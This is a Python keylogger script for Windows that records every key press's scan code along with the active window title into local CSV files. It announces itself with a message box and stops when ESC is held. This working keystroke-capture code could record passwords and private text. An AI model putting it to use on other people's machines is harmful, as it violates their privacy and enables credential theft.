import csv
import keyboard
import pygetwindow as gw
from datetime import datetime
import sys
import ctypes
import os
import ctypes


def message_box(text):
    return ctypes.windll.user32.MessageBoxW(
        0, text, "Key Logger Python - Gabriel Moscarde", 0
    )


class Logger:
    def __init__(self):
        self.log = []
        self.windows_map_path = "map/windows_map.csv"
        self.windows_map = self.read_windows_map()
        self.path_log = self.create_path_log()
        self.initial_minute = datetime.now().minute

    def read_windows_map(self):
        if os.path.exists(self.windows_map_path):
            windows_map = []
            with open(
                self.windows_map_path, "r", newline="", encoding="utf-8"
            ) as csv_file:
                reader = csv.DictReader(csv_file)
                for row in reader:
                    windows_map.append(dict(row))

                return windows_map

    def start(self):
        keyboard.on_press(self.on_key_press)
        keyboard.wait()

    def on_key_press(self, event):
        window_title = gw.getActiveWindowTitle()
        if len([key for key in self.log if key[0] == 1]) > 100:
            keyboard.unhook_all()
            message_box("Stopping logger...")
            sys.exit()

        if window_title not in [window["title"] for window in self.windows_map]:
            self.windows_map.append(
                {
                    "code": len(self.windows_map) + 1,
                    "title": str(window_title),
                }
            )
            window_code = len(self.windows_map)
        else:
            window_code = [
                window["code"]
                for window in self.windows_map
                if window["title"] == window_title
            ][0]

        print(
            "Key pressed:",
            str(event.name).upper(),
            "scan_code:",
            event.scan_code,
            "window_code:",
            window_code,
        )

        self.log.append([event.scan_code, window_code])

        if self.minute_passed():
            self.save_log(self.log)
            self.log = []
            print("Logging...")

    def minute_passed(self):
        actual_minute = datetime.now().minute

        if actual_minute != self.initial_minute:
            self.initial_minute = actual_minute
            return True
        else:
            return False

    def save_log(self, log):
        self.save_windows_map()

        if os.path.exists(self.path_log):
            with open(self.path_log, "a", newline="", encoding="utf-8") as csv_file:
                for register in log:
                    writer = csv.writer(csv_file)
                    writer.writerow(register)

        else:
            with open(self.path_log, "w", newline="", encoding="utf-8") as csv_file:
                headers = ["window_code", "key_code"]
                writer = csv.writer(csv_file)
                writer.writerow(headers)

                for register in log:
                    writer.writerow(register)

    def create_path_log(self):
        date = datetime.now().strftime("%d-%m-%Y")
        return f"logs/log_{date}.csv"

    def save_windows_map(self):
        with open(self.windows_map_path, "w", newline="", encoding="utf-8") as csv_file:
            headers = ["code", "title"]
            writer = csv.DictWriter(csv_file, fieldnames=headers)

            writer.writeheader()
            for row in self.windows_map:
                writer.writerow(row)


if __name__ == "__main__":
    message_box(
        """Starting logger...
To stop press ESC for 5 seconds!

Press OK to continue..."""
    )
    logger = Logger()
    logger.start()
